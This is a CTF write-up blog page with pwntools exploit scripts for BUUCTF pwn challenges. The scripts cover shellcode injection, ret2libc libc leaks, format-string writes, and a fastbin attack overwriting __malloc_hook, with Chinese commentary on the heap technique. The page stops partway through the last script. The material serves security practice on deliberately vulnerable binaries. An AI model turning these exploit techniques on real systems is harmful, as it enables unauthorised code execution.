<h1 id="buu018-ciscn-2019-n-5"><a href="#buu018-ciscn-2019-n-5" class="headerlink" title="buu018-ciscn_2019_n_5"></a>buu018-ciscn_2019_n_5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29724</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400713</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">bss = <span class="number">0x601080</span></span><br><span class="line">leave = <span class="number">0x4006a9</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me your name&#x27;</span>, asm(shellcraft.amd64.sh()))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>) + p64(bss) + p64(bss)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What do you want to say to me?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu019-others-shellcode"><a href="#buu019-others-shellcode" class="headerlink" title="buu019-others_shellcode"></a>buu019-others_shellcode</h1><p>连上就行</p>
<h1 id="buu020-ciscn-2019-ne-5"><a href="#buu020-ciscn-2019-ne-5" class="headerlink" title="buu020-ciscn_2019_ne_5"></a>buu020-ciscn_2019_ne_5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25761</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input admin password:&#x27;</span>, <span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">76</span>) + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input admin password:&#x27;</span>, <span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">76</span>) + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu021-铁人三项-第五赛区-2018-rop"><a href="#buu021-铁人三项-第五赛区-2018-rop" class="headerlink" title="buu021-铁人三项(第五赛区)_2018_rop"></a>buu021-铁人三项(第五赛区)_2018_rop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26419</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc32&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x8c</span>) + p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write)</span><br><span class="line">base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base = write - libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># sys = base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = base + next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x8c</span>) + p32(sys) + p32(binsh) + p32(binsh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu022-bjdctf-2020-babyrop"><a href="#buu022-bjdctf-2020-babyrop" class="headerlink" title="buu022-bjdctf_2020_babyrop"></a>buu022-bjdctf_2020_babyrop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27132</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span> + <span class="number">8</span>) + p64(poprdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me u story!\n&#x27;</span>, payload)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span> + <span class="number">8</span>) + p64(poprdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me u story!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu023-bjdctf-2020-babystack2"><a href="#buu023-bjdctf-2020-babystack2" class="headerlink" title="buu023-bjdctf_2020_babystack2"></a>buu023-bjdctf_2020_babystack2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25497</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+]Please input the length of your name:&#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+]What\&#x27;s u name?&#x27;</span>, cyclic(<span class="number">16</span>+<span class="number">8</span>) + p64(elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu024-jarvisoj-fm"><a href="#buu024-jarvisoj-fm" class="headerlink" title="buu024-jarvisoj_fm"></a>buu024-jarvisoj_fm</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29021</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(fmtstr_payload(<span class="number">11</span>, &#123;<span class="number">0x804A02C</span>: <span class="number">4</span>&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu025-pwn2-sctf-2016"><a href="#buu025-pwn2-sctf-2016" class="headerlink" title="buu025-pwn2_sctf_2016"></a>buu025-pwn2_sctf_2016</h1><p>这一题真是吃尽苦头，LibcSearcher不给力，找半天也没找到适合的libc（应该是libc6-i386_2.23_0ubuntu10_amd64，但是由于LibcSearcher连的是ubuntu官网，这个版本被删了，然后就找不到了。。。）。看着这道题没做出来实在是气，不过又看到了程序中有一个int 80，于是思考能不能用系统调用解决问题。发现很难，因为给的gadget都是inc，执行完vuln函数之后eax,ebx,edx都是很小的值，总不可能一个inc执行几十万次吧？<br>查看了下gadget，ebx,edi,esi,ebp倒是能直接控制，对于eax,ecx,edx还是要费很多心思。<br>后来给用pip装的LibcSearcher卸了换上<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">国人写的</a>就好了。果然还是国人给力o(￣▽￣)ｄ<br>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29855</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_anyaddr</span>(<span class="params">addr</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;want me to read? &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]) + p32(addr))</span><br><span class="line">	content = io.recvuntil(<span class="string">b&#x27;How&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many bytes do you want me to read? &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">io.recvuntil(p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recv(4)</span></span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf))</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(sys) + p32(binsh) + p32(binsh))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu026-babyheap-0ctf-2017"><a href="#buu026-babyheap-0ctf-2017" class="headerlink" title="buu026-babyheap_0ctf_2017"></a>buu026-babyheap_0ctf_2017</h1><p>第一道堆题。<br><strong>解法：unsorted bin overlapping chunks + fastbin attack</strong><br>提供了分配chunk、填充chunk、释放chunk、打印chunk内容4个功能。其中填充chunk功能没有进行边界检查，可以产生堆溢出：<br><img src="https://img-blog.csdnimg.cn/819fff57a2e84971a375beb1be6ffc31.png"><br>简单看了一下，试了几下之后，发现这道题和前面所有题都截然不同，难度完全不是一个档次。<br>首先，这道题中<strong>对于内存的分配使用的是calloc而非malloc函数</strong>，这使得我们要想获得libc的加载地址必须首先进行堆块重叠后释放内部堆块，这样才能够通过读取外部堆块获取关键地址。另外，<strong>本题的堆块大小保存在一个单独的数组之中，可读取的大小也在这里保存，因此直接在堆中修改chunk的size并不能增加我们读取的长度</strong>。要想实现堆块的重叠就必须首先释放堆块，通过堆溢出修改堆块的size后分配回来。但这样的话，由于calloc的特性，堆块中的所有内容都将被抹除，也就无法获取到地址的值。因此，要保留地址的值，我们不能将这个堆块全部分配回来。要知道，虽然内部重叠堆块的prev_size和size等信息虽然被清零，但仍然能够读取后面的内容，所以我们选择将修改过大小的堆块部分分配回来，留下一个last_remainder堆块保留在原先的内部堆块的内部。这样就可以通过访问内部堆块获取到地址的值了。<br><img src="https://img-blog.csdnimg.cn/0481579d7899474cbe33733f3aa828e4.png"></p>
<p>获取到了这里的地址，我们就可以获取到system函数和__free_hook的地址。本题环境为2.23，无tcache的影响，有通过fastbin attack修改__malloc_hook的可行性。</p>
<p>这是一开始__malloc_hook附近的情况：<br><img src="https://img-blog.csdnimg.cn/b90efebb8ce54bd7ae8349c3569acd6f.png"><br>要想在__malloc_hook附近分配chunk，首先需要通过检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>下面是fastbin_index的宏定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure>
<p>我们可以通过地址错位达到目的：</p>
<table>
<thead>
<tr>
<th align="center">address</th>
<th align="center">+0</th>
<th align="center">+1</th>
<th align="center">+2</th>
<th align="center">+3</th>
<th align="center">+4</th>
<th align="center">+5</th>
<th align="center">+6</th>
<th align="center">+7</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x7fc36e4ddaf0</td>
<td align="center">60</td>
<td align="center">c2</td>
<td align="center">4d</td>
<td align="center">6e</td>
<td align="center">c3</td>
<td align="center"><font color=red>7f</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
</tr>
<tr>
<td align="center">0x7fc36e4ddaf8</td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
</tr>
<tr>
<td align="center">0x7fc36e4ddb00</td>
<td align="center">a0</td>
<td align="center">ee</td>
<td align="center">19</td>
<td align="center">6e</td>
<td align="center">c3</td>
<td align="center">7f</td>
<td align="center">00</td>
<td align="center">00</td>
</tr>
</tbody></table>
<p>红色部分刚好能通过这个检查，需要使fd变为__malloc_hook-0x23才行，其对应的fastbin应该是存放0x70大小chunk的fastbin，因此我们要事先分配好0x70大小的chunk然后释放它，修改fd指针后再申请回来即可。<br>拿到__malloc_hook处的chunk后向__malloc_hook写入one_gadget即可，尝试了4个只有一个能成功，而且最后一次分配chunk还必须在interactive之后手动分配，自动分配打远程会卡住……</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;, 29330)</span></span><br><span class="line"></span><br><span class="line">in_use = [<span class="literal">False</span>] * <span class="number">0x10</span>		<span class="comment"># in_use array</span></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;Allocate Index &#x27;</span>)</span><br><span class="line">	allocated_index = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">10</span>)</span><br><span class="line">	in_use[allocated_index] = <span class="literal">True</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendafter(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	in_use[index] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x110</span>)		<span class="comment"># chunk #0</span></span><br><span class="line">allocate(<span class="number">0x110</span>)		<span class="comment"># chunk #1</span></span><br><span class="line">allocate(<span class="number">0x110</span>)		<span class="comment"># chunk #2</span></span><br><span class="line">allocate(<span class="number">0x110</span>)		<span class="comment"># chunk #3</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x110</span>)</span><br><span class="line">payload += p64(<span class="number">0x120</span>)		<span class="comment"># prev_size of chunk #1</span></span><br><span class="line">payload += p64(<span class="number">0x241</span>)		<span class="comment"># fake size of chunk #1</span></span><br><span class="line">fill(<span class="number">0</span>, <span class="number">0x120</span>, payload)</span><br><span class="line"></span><br><span class="line">release(<span class="number">1</span>)</span><br><span class="line">allocate(<span 